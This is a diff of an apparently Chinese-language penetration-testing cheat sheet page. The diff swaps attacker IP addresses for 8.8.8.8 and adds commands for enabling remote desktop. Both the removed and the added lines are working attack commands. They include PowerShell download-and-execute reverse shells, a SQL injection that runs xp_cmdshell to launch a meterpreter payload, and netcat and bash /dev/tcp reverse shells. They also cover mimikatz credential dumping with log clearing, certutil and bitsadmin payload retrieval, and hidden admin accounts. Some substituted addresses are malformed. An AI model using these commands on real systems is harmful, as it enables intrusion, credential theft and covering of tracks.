@@ -250,29 +250,29 @@ echo "0x$(ncat -lvp 9000 |grep -i evil|tr -d '/' |cut -d ' ' -f2)" |xxd -r -p
 <p>反弹shell或传马(使用tcpdump -i eth0 icmp 来监听或者搭建web服务器查看访问日志等来能否出网）。</p>
 <h3 id="window--使用ping-或者下面的download来判断是否能够出网">window  使用ping 或者下面的download来判断是否能够出网，</h3>
 <p>powershell直接反弹(03默认无powershell winserver08默认是2.0）</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.64.128/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.64.128 -port 8888 #反弹shell
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 8.8.8.8 -port 8888 #反弹shell
 powershell -C "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -l -p 8888"  #监听本地nc
 
-http://192.168.44.132/2.php?id=1;exec master..xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString(''http://youvps/Empire/data/module_source/code_execution/Invoke-Shellcode.ps1'');Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 192.168.44.128 -lport 4444 -force';--   #powershell调用msf反弹
+http://8.8.8.8/2.php?id=1;exec master..xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString(''http://youvps/Empire/data/module_source/code_execution/Invoke-Shellcode.ps1'');Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 8.8.8.8 -lport 4444 -force';--   #powershell调用msf反弹
 
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.64.128/nishang/Scan/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254   #扫描端口
+IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/nishang/Scan/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254   #扫描端口
 </code></pre></div></div>
 <p>msf或者nc或者colbat strike传马等(msf为例)</p>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>生成恶意程序上传执行
-msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.127.132 lport=8888 -f dll -o test.dll
+msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=8.8.8.8 lport=8888 -f dll -o test.dll
 regsvr32 test.dll   #运行dll
 
 attacker监听
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.127.132
+set LHOST 8.8.8.8
 set LPORT 8888
 exploit
 
 nc -vv 115.28.206.51 8080 -e c:\cmd.exe //链接到远程 不输入-e选项即时聊天
 nc -lvvp 8080   //反弹
-nc -nv 192.168.64.1 8080 -e C:\Windows\System32\cmd.exe
+nc -nv 8.8.8.8 8080 -e C:\Windows\System32\cmd.exe
 nc -lvp 8080
 </code></pre></div></div>
 <p>直接添加用户</p>
@@ -280,9 +280,20 @@ nc -lvp 8080
 net localgroup administrators xxx /add  #将xxx用户加入管理员
 net user xxx /del   #删除用户
 
+for 03 08
 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  #开启3389 03 08测试通过
 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000001 /f  #关闭3389
 REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber #查看远程端口 十六进制
+
+2.通用开3389(优化后)：
+wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+3.For Every:
+cmd开3389 win08 win03 win7 win2012 winxp
+win08，三条命令即可:
+wmic /namespace:\root\cimv2        erminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
+wmic /namespace:\root\cimv2        erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
+win2012通用；win7前两条即可。权限需要run as administrator。
 </code></pre></div></div>
 <h3 id="linux-1">linux</h3>
 
@@ -331,7 +342,7 @@ p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;
 p.waitFor()
 
 node.js
-require('child_process').exec('bash -i &gt;&amp; /dev/tcp/1.2.3.4/80 0&gt;&amp;1');
+require('child_process').exec('bash -i &gt;&amp; /dev/tcp/8.8.8.8/80 0&gt;&amp;1');
 nc -lvvp 80
 
 lua
@@ -356,10 +367,10 @@ userdel -r test     #删除该用户
 </code></pre></div></div>
 <h3 id="window-1">window</h3>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>提权参考    #https://github.com/SecWiki/windows-kernel-exploits
-powershell IEX (New-Object Net.WebClient).DownloadString('http://74.121.151.89/123344/PowerShell/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://74.121.151.89/123344/ms15-051.exe -ExeArgs "cmd" -ForceASLR #远程执行exe
+powershell IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/123344/PowerShell/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://8.8.8.8/123344/ms15-051.exe -ExeArgs "cmd" -ForceASLR #远程执行exe
 mimikatz    #抓取密码
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"  #https://github.com/gentilkiwi/mimikatz
-powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.64.128/nishang/Gather/Invoke-Mimikatz.ps1');Invoke-Mimikatz  #远程调用mimikaz  web中注意引号
+powershell IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/nishang/Gather/Invoke-Mimikatz.ps1');Invoke-Mimikatz  #远程调用mimikaz  web中注意引号
 mimikaz清除登陆等日志信息
 privilege::debug
 event::drop
@@ -383,9 +394,9 @@ powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3g
 
 certutil    #03 08都可以
 certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe&amp;&amp;c:\download\a.exe
-certutil -urlcache -split -f http://192.168.254.102:80/a.txt b.txt
-certutil -urlcache -split -f http://192.168.254.102:80/a a.js &amp;&amp; cscript a.js &amp;&amp;  del a.js &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete  #远程执行js
-certutil -urlcache -split -f http://74.121.151.89/123344/1.vbs a.vbs &amp;&amp; cscript a.vbs &amp;&amp;  del a.vbs &amp;&amp; certutil -urlcache -split -f http://74.121.151.89/123344/1.vbs delete    #加载vbs执行
+certutil -urlcache -split -f http://8.8.8.802:80/a.txt b.txt
+certutil -urlcache -split -f http://8.8.8.802:80/a a.js &amp;&amp; cscript a.js &amp;&amp;  del a.js &amp;&amp; certutil -urlcache -split -f http://8.8.8.802:80/a delete  #远程执行js
+certutil -urlcache -split -f http://8.8.8.8/123344/1.vbs a.vbs &amp;&amp; cscript a.vbs &amp;&amp;  del a.vbs &amp;&amp; certutil -urlcache -split -f http://8.8.8.8/123344/1.vbs delete    #加载vbs执行
 vbs 示例代码    #下载保存到c盘
 Set xPost=createObject("Microsoft.XMLHTTP")
 xPost.Open "GET","http://192.168.206.101/file.zip",0
@@ -399,7 +410,7 @@ sGet.SaveToFile "c:\file.zip",2
 
 win03无 xp以后自带   #下载速度较慢
 bitsadmin /transfer n http://lemon.com/file.zip c:\1.zip
-bitsadmin /transfer n http://74.121.151.89/mimikaz.exe Z:/file/proof/tmp/1.exe
+bitsadmin /transfer n http://8.8.8.8/mimikaz.exe Z:/file/proof/tmp/1.exe
 bitsadmin /transfer n http://download.sysinternals.com/files/PSTools.zip C:\test\update\PSTools.zip
 bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\p.zip
 
